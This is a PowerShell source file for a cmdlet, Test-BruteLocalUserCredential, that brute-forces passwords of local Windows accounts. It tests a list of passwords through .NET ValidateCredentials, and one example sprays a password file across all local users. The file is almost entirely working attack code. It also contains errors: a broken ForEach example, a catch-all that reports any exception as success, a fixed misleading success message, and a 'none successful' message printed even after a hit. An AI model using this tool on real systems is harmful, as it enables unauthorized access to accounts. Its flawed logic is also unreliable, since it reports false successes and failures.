<#
.SYNOPSIS
This cmdlet is used to brute for the password of a local user account on a windows machine


.DESCRIPTION
Use .NET to brute force the password of a local account on a windows machine using the ValidateCredentials method


.PARAMETER Username
This parameter defines the local user account you wish to test passwords against

.PARAMETER Passwd
This parameter defines the passwords you wish to test against the local user account you define


.EXAMPLE
Test-BruteLocalUserCredential -Username Administrator -Passwd 'Password123!','Passw0rd1!'
# This example tests the two defined passwords against the Administrator user account

.EXAMPLE
Test-BruteLocalUserCredential -Username Administrator -Passwd (Get-Content -Path C:\Temp\passlist.txt)
# This example tests the passwords inside the C:\Temp\passlist.txt file against the Administrator user account

.EXAMPLE
$Users = (Get-LocalUser).Name
ForEach $U in $Users) {Test-BruteLocalUserCredential -Username $U -Passwd (Get-Content -Path C:\Temp\passlist.txt)}
# This example tests a password list against all local user accounts


.NOTES
Author: Robert H. Osborne
Alias: tobor
Contact: rosborne@osbornepro.com


.LINK
https://roberthsoborne.com
https://writeups.osbornepro.com
https://btps-secpack.com
https://github.com/tobor88
https://gitlab.com/tobor88
https://www.powershellgallery.com/profiles/tobor
https://www.linkedin.com/in/roberthosborne/
https://www.credly.com/users/roberthosborne/badges
https://www.hackthebox.eu/profile/52286


.INPUTS
None


.OUTPUTS
None

#>
Function Test-BruteLocalUserCredential {
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$True,
                ValueFromPipeline=$False,
                HelpMessage="`n[H] Enter the username of the local account you wish to brute password tests against. `n[E] EXAMPLE: Administrator")]  # End Parameter
            [Alias('Name','User','u')]
            [ValidateScript({Get-LocalUser -Name $_})]
            [String]$Username,

            [Parameter(
                Mandatory=$True,
                ValueFromPipeline=$False,
                HelpMessage="`n[H] Define passwords to test against the user specified, separate multiple values with a comma, EXAMPLE: 'Passw0rd1!','Password123!'")]  # End Parameter
            [String[]]$Passwd

        )  # End param

    $ErrorActionPreference = "SilentlyContinue"
    $Final = $Passwd[-1]

    Write-Verbose "Adding required .NET method for Account Management"

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    $Type = [DirectoryServices.AccountManagement.ContextType]::Machine
    $Attempt = [DirectoryServices.AccountManagement.PrincipalContext]::New($Type)

    ForEach ($P in $Passwd)
    {

        Try
        {

            If (!($Attempt.ValidateCredentials($Username,$P)))
            {

                Write-Verbose "FAILURE: $Username : $P"

            }  # End If
            Else
            {

                Write-Output "[*] SUCCESS: However this user does not have Sign In permissions"
                $Result = New-Object -TypeName PSCustomObject -Property @{Username=$Username; Password=$P}

            }  # End Else

            If ($P -eq $Final)
            {

                Write-Output "[*] None of the specified credentials were successful"

            }  # End If

        }  # End Try
        Catch [UnauthorizedAccessException]
        {

            Write-Verbose "FAILURE: $Username : $P"

        }  # End Catch Exception
        Catch
        {

            Write-Output "[*] SUCCESS: However this user does not have Sign In permissions"
            $Result = New-Object -TypeName PSCustomObject -Property @{Username=$Username; Password=$P}

        }  # End Catch
        Finally
        {

            If ($Result)
            {

                $Result

            }  # End If

        }  # End Finally

    }  # End ForEach

}  # End Function Test-BruteLocalUserCredential
